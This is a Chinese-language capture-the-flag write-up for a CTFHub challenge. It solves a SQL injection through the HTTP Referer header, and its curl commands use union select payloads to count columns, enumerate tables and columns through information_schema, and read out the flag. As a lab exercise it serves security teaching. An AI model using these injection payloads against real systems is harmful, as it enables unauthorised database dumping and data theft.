---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - Refer注入"
date: 2026-10-27

skill: "web-sql/Refer注入"
completed: true
---

# CTFHub Writeup - Refer注入

## 题目类型

Web

## 题目描述

<h1>Refer注入</h1>
<p>请在referer输入ID</p>

## 解题过程

<br>1. 先直接请求目标页面：执行 curl -s http://challenge-ba0e94cda65140d0.sandbox.ctfhub.com:10800/，不带 Referer 时页面只返回 \<h1\>Refer注入\</h1\> 和 \<p\>请在referer输入ID\</p\>，没有 \<code\> 回显。随后执行 curl -s -e "1" http://challenge-ba0e94cda65140d0.sandbox.ctfhub.com:10800/，页面回显 \<code\>select \* from news where id=1\</code\>，并显示 ID: 1、Data: ctfhub。
<br>2. 确认注入点时，先在 URL 上追加 ?id=999 并设置 Referer 为 1，执行 curl -s -e "1" "http://...?id=999"，回显仍是 \<code\>select \* from news where id=1\</code\> 和 ID: 1、Data: ctfhub，记录判断 URL 参数没有进入 SQL。接着在 Referer 中放入 -1 union select 1,2，执行 curl -s -e "-1 union select 1,2" http://...，页面回显 \<code\>select \* from news where id=-1 union select 1,2\</code\>，并显示 ID: 1、Data: 2；记录由此确认数字型、2 列，结果显示在 ID/Data。随后执行 curl -s -e "-1 union select 1,database()" http://...，Data 返回 sqli。
<br>3. 拖库时先枚举表名，执行 curl -s -e "-1 union select 1,group\_concat(table\_name) from information\_schema.tables where table\_schema=database()" http://...，Data 返回 uonmobupqo,news；再对非 news 表枚举列名，执行 curl -s -e "-1 union select 1,group\_concat(column\_name) from information\_schema.columns where table\_schema=database() and table\_name='uonmobupqo'" http://...，Data 返回 maqgnfvsun；最后执行 curl -s -e "-1 union select 1,maqgnfvsun from uonmobupqo" http://...，Data 返回 ctfhub\{c9838538aae4617d997a20f0\}。

## 疑问与解答

### 1.

<br>问题：为什么在 URL 参数 id 中传值没有效果？
<br>解答：本题页面只把 Referer 的值拼进 SQL，URL 参数没有被使用；证据中访问 ?id=999 时，回显的 SQL 仍然是 select \* from news where id=1。

### 2.

<br>问题：为什么用 -1 union select 1,2 可以判断列数和回显位？
<br>解答：-1 让原查询不返回记录，union 后的 select 1,2 作为两列占位单独显示；页面出现 ID: 1 和 Data: 2，说明查询按两列处理，且两列都能回显。

### 3.

<br>问题：information\_schema 在本题拖库中起什么作用？
<br>解答：它是 MySQL 的元数据库，tables 表提供表名、columns 表提供列名；本题通过 table\_schema=database() 和 table\_name='uonmobupqo' 限定范围，逐步拿到随机表名、列名并读取字段值。


## 本题的核心逻辑：


<br>本题的注入点位于 HTTP Referer 请求头，而不是 URL 的 id 参数：当请求带有 Referer 时，服务端把该值拼接到 select \* from news where id=... 中，并把拼接后的 SQL 与查询结果回显到页面，因此 Referer 中的内容可以改变 SQL 语义。

<br>利用时先用 -1 让原查询无结果，再用 union select 1,2 判断列数和回显列；确认两列回显后，通过 database() 获取库名，通过 information\_schema.tables 和 information\_schema.columns 枚举表名、列名，最后读取目标字段得到 flag。


## 笔记

这道题主要学习了：

<br>1. HTTP 请求头也可能成为注入入口，测试时不能只关注 URL 参数和表单字段，还要检查 Referer、User-Agent、Cookie 等可控头部。
<br>2. Union 注入常用 -1 或 and 1=2 让原查询为空，再用 select 1,2,... 探测列数与回显位；列数匹配后即可把 database()、user() 等函数结果放到回显列。
<br>3. information\_schema 是 MySQL 的元数据库，tables 和 columns 表可枚举库中的表名与列名；拖库时通常按库名、表名、列名、字段值的顺序推进。
